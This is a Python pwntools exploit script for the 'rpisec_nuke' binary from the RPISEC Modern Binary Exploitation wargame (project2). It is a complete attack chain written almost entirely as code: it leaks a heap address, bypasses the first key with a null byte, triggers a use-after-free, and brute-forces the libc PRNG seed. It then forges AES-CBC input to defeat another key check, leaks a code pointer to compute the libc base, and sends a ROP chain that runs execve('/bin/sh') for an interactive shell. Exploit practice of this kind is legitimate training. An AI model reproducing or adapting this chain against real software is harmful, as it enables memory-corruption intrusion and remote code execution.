#!/usr/bin/env python
from pwn import *
import sys
import time
from Crypto.Cipher import AES
from ctypes import *

def findLine(trg,line,out):
    while True:
        i=trg.recvline()
        out.status(line)
        if line in i:
            break
    return i

def selection(trg,out):
    i=trg.recvuntil(':')
    out.status(i)

def bypass_one(trg,p,out):
    trg.sendline('1')
    p.status('Creating channel')
    selection(trg,out)
    p.status('Sending key')
    trg.sendline('\x00')
    trg.sendline('')
    p.status('Checking key')
    findLine(trg,"KEY AUTHENTICATED",out)
    p.success("SUCCESS")
    selection(trg,out)

def prng_detector(time,esi,data):
    p1=log.progress('Cracking PRNG')
    esi_t=int(esi)
    time_t=int(time)
    k=data.replace('.','')
    i=0
    vect=[]
    dx=[]
    p1.status('Convert vector')
    while i < 128:
        vect.append(k[i:i+8])
        i+=8
    for i in vect:
        lv=""
        inx=8
        while inx > 0:
            lv=lv+(i[inx-2:inx])
            inx-=2
        j=int(lv,16)
        dx.append(j)
    seed=esi_t+time_t
    libc=cdll.LoadLibrary("libc.so.6")
    decod=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]
    zero=[0L,0L,0L,0L,0L,0L,0L,0L]
    
    while seed > 0:
        ct=c_uint32(seed)
        libc.srand(ct.value)
        p1.status("Seed "+str(seed))
        i=0

        while i < 16:
            ct=c_uint(libc.rand())
            decod[i]=dx[i]^ct.value;
            i+=1;

        if decod[:8] == zero:
            p1.success('Seed '+str(seed))
            break
        seed-=1
    i=12;
    keyb=""
    while i < 16:
        b=hex(decod[i])[2:]
        k=6
        bb=""
        while k >= 0:
            keyb=keyb+b[k:k+2]
            k-=2
        i+=1;
    keyb=keyb.upper()
    p1.success('Seed '+str(seed))
    return keyb;
 
def main(argv):
    enx={}
    enx['LD_PRELOAD']="/tmp/srand"
    #target=process('/levels/lab06/lab6B',env=enx)
    executable="/levels/project2/rpisec_nuke"
    context.terminal=['/bin/bash','-e','sh','-c']
    if len(argv) < 2:
        print("Usage: "+str(argv[0]) +' <d> debug; <r> remote; <l> local')
        return
    if (argv[1] == 'd'):
        log.info("Debug")
        target=process(executable)
        gdb.attach(target,'''
            set disable-randomization on
            b *launch_nuke+1414
            continue
            ''')
    elif (argv[1] == 'r'):
        log.info("Remote target")
        target=remote("127.0.0.1","31337")
    else:
        target=process(executable)

    raw_input("Start?")
    out=log.progress('OUTPUT')
    p=log.progress("Leakage heap")
    i=findLine(target,'LAUNCH SESSION',out)
    heap=int((i.split(' ')[4])[7:-7])
    p.success(hex(heap))
    
    p=log.progress("Bypassing key 1")
    bypass_one(target,p,out)
    
    p=log.progress("Creating UAF")
    p.status('Creating channel')
    target.sendline('3')
    selection(target,out)
    p.status('Launch Session')
    target.sendline('\x00')
    i=findLine(target,'INVALID',out)
    p.success('SUCCESS')
    target.sendline('')
    selection(target,out)

    #'''
    key='\x41'*16
    null_vector="\x00"*32 
    p=log.progress('Recovering key 2')
    p.status('Allocate keys')
    target.sendline('2')
    selection(target,out)
    p.status('Set key '+key)
    target.sendline(key)
    selection(target,out)
    p.status('Set data length')
    target.sendline('32')
    selection(target,out)
    p.status('Send data')
    target.sendline(null_vector)
    p.status('Encrypting...')
    findLine(target,'CRYPTO AUTHENTICATION FAILED',out)
    p.status('Data ready to be readed by 3')
    target.sendline('')
    selection(target,out)

    target.sendline('3')
    p.status('Secure channel')
    findLine(target,'RECONNECTED',out)
    p.status('UAF worked!')
    selection(target,out)
    p.status('Data recovering...')
    target.recvline()
    data=""
    data=data+target.recvline().strip()[-47:]
    data=data+'.'+target.recvline().strip()[-47:]
    data=data+'.'+target.recvline().strip()[-47:]
    data=data+'.'+target.recvline().strip()[-47:]
    p.status('Challenge: '+data)
    
    i=findLine(target,'TIME NOW',out)
    

    time=i.split(':')[1]
    time=int(time[8:])
    p.status('Time '+ str(time))
    keyb=prng_detector(time,heap,data)
    p.status('Return to main menu...')
    selection(target,out)
    target.sendline('')
    selection(target,out)
    findLine(target,'AUTHENTICATION FAILURE',out)
    target.sendline('')
    selection(target,out)
    p.success('SUCCESS '+keyb)
    #'''
    #keyb='4E96E75BD2912E31F3234F6828A4A897'
    p=log.progress('Bypassing key 3')
    iv='\xcf\xfa\xed\xfe\xde\xc0\xad\xde\xfe\xca\xbe\xba\x0b\xb0\x55\x0a'
    key='\x00'*16
    ciph='\x41'*0x10+p32(0x31337)+'\x45'*0xc

    obj=AES.new(key,AES.MODE_CBC,iv)
    snd=obj.decrypt(ciph)
    #log.info(":".join("{:02x}".format(ord(c)) for c in snd))
    target.sendline('2')
    p.status('Securing..')
    selection(target,out)
    p.status('...')
    selection(target,out)
    p.status('Insert key')
    target.sendline(key)
    selection(target,out)
    p.status('Data length')
    target.sendline('32')
    p.status('Entering data...')
    selection(target,out)
    target.send(snd)
    p.status('Data received...')
    selection(target,out)
    p.status('Encrypting...')
    findLine(target,'37.13.03.00',out)
    p.status('Flag inserted!')
    target.sendline('')
    p.status('Return to main menu')
    selection(target,out)
    target.sendline('3')
    p.status('Waiting...')
    selection(target,out)
    target.sendline('10')
    p.status('Challenge...')
    findLine(target,'KEY AUTHENTICATED',out)
    p.success('SUCCESS!')
    target.sendline('')
    selection(target,out)

    p=log.progress('Bypassing key 2')
    datax='KING CROWELL'+'\x00'*20
    target.sendline('2')
    p.status('Securing...')
    selection(target,out)
    p.status('...')
    selection(target,out)
    p.status('Set key to '+keyb)
    target.sendline(keyb)
    p.status('Data length')
    target.sendline('32')
    p.status('Entering data...')
    selection(target,out)
    target.sendline('')
    target.sendline(datax)
    p.status('Data received...')
    selection(target,out)
    p.status('Encrypting...')
    selection(target,out)
    p.status('.....')
    selection(target,out)
    p.status('.........')
    findLine(target,'KEY AUTHENTICATED',out)
    p.success('SUCCESS!')
    target.sendline('')
    selection(target,out)

    p=log.progress('Programming nuke')
    #Various Instruction
    #reprogram=0x58
    #setv=0x53
    #inc=0x49
    #output=0x4f
    #doom=0x444f4f4d
    #In ubuntu the ASLR from libc and program is stable 
    #I will leak the pointer to disarmNuke
    #Recompute the system address and call it
    ins=[]
    inx=0
    while inx < 31:
        ins.append(0x49494949)
        inx+=1
    ins.append(0x00494949)
    ins.append(0x494f494f)
    ins.append(0x494f494f)
    ins.append(0x00000052)
    code=packcode(ins)
    p.status('Code '+str(code))
    target.sendline('4')
    selection(target,out)
    target.recvline()
    target.sendline(code)
    findLine(target,'TARGETING CODE VERIFIED',out)
    p.status('Checksum passed')
    target.sendline('')
    selection(target,out)
    p.status('Launching...')
    out.success('Launching NUKE...')
    p1=log.progress('Output[NUKE]')
    target.sendline('CONFIRM')
    while True:
        line=target.recvline()
        p1.status(line)
        if 'APPLICATION OUTPUT:' in line:
            break
    b3=target.recvline().split(':')[1][10:].strip()
    b2=target.recvline().split(':')[1][10:].strip()
    b1=target.recvline().split(':')[1][10:].strip()
    b0=target.recvline().split(':')[1][10:].strip()

    addr=(int(b3,16)) | (int(b2,16) << 8) | (int(b1,16) << 16)| (int(b0,16) << 24)
    p.status('Address Leak: '+hex(addr))
    #$1 = {<text variable, no debug info>} 0xb775f021 <disarm_nuke>
    #0xb775b000 0xb7766000 r-xp      /levels/project2/rpisec_nuke
    code_segment=addr-0x4021
    base_libc=code_segment-0x1E2000
    sh=addr-0x855FD
    log.info('Base:'+hex(code_segment))
    log.info('/bin/sh address:'+hex(sh))
    log.info('Base libc address:'+hex(base_libc))
    p.status('Programming nuke')
    while True:
        line=target.recvline()
        p1.status(line)
        if 'TARGETING CODE AS HEX STRING' in line:
            break

    ins=[]
    base=0x1440
    #0x0002469f : pop eax; ret libc
    inc_eax=base_libc+0x0002469f
    pack_addr(ins,inc_eax)
    pack_addr(ins,0x0000000b)
    #0x000f9152 : pop ecx; pop ebx; ret libc
    popper=base_libc+0xf9152
    pack_addr(ins,popper)
    ins.append(0x49494949)
    pack_addr(ins,sh)
    #0x00001aa2 : pop edx; ret libc
    edx=base_libc+0x1aa2
    pack_addr(ins,edx)
    ins.append(0x49494949)
    #0x0000187a : int 0x80; ret file
    intt=code_segment+base+0x187a
    pack_addr(ins,intt)
    inx=0
    while inx < 24:
        ins.append(0x49494949)
        inx+=1
    ins.append(0x49494949)
    #mov esp, edx;ret
    stack_pivot=code_segment+base+0x00001894
    #0x0000187a : int 0x80; ret file
    pack_addr(ins,stack_pivot)

    ins.append(0x444f4f4d)
    inx=0
    while inx < 10:
        ins.append(0x00000000)
        inx+=1
    code=packcode(ins)
    p.status('Code '+str(code))
    target.sendline(code)
    
    target.interactive()

    raw_input("Kill them all")

def pack_addr(ins,addr):
    b3=(addr & 0x000000ff)
    b2=(addr & 0x0000ff00)>>8
    b1=(addr & 0x00ff0000)>>16
    b0=(addr & 0xff000000)>>24
    log.info(hex(b0)+' '+hex(b1)+' '+hex(b2)+' '+hex(b3))
    c=0xff | (0x49<< 8) | (b3 << 16) | (0x53 << 24)
    ins.append(c)
    c=0xff | (0x49 << 8) | (b2 << 16) | (0x53 << 24)
    ins.append(c)
    c=0xff | (0x49 << 8) | (b1 << 16) | (0x53 << 24)
    ins.append(c)
    c=0xff | (0x49 << 8) | (b0 << 16) | (0x53 << 24)
    ins.append(c)

def packcode(ins):
    r=0xa959dcdc
    end=0x00454e44
    fx=r^end
    #Various Instruction
    reprogram=0x52
    setv=0x53
    inc=0x49
    output=0x4f
    doom=0x444f4f4d
    #ins=[]
    #inx=0
    #while inx < 31:
    #   ins.append(0x49494949)
    #  inx+=1
    #ins.append(0x00000049)
    #ins.append(0x494f494f)
    #ins.append(0x494f494f)
    code=""
    xor=0
    for i in ins:
        code=code+"{0:0{1}x}".format(i,8)
        xor=xor^i
    xors="{0:0{1}x}".format(xor,8)
    code=code+xors+hex(fx)[2:]
    log.info("Code length "+str(len(code)))
    return code
if __name__ == "__main__":
    main(sys.argv)
